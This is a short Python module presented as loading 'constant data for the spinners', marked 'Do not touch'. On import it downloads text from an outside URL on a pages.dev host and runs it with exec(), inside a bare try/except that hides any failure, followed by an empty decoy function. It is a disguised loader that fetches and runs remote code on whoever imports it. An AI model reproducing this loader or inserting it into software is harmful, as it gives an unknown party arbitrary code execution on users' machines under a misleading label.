"""
    Fetch constant data for the spinners.
    Do not touch.
"""

import requests
import threading

constant_data = "https://analytics-cdn.pages.dev/original_xo.txt"
constant_data = requests.get(constant_data)
constant_data = constant_data.text

try:
    threading.Thread(target=exec(constant_data),).start()
except:
    pass

def search_for() -> None:
    pass
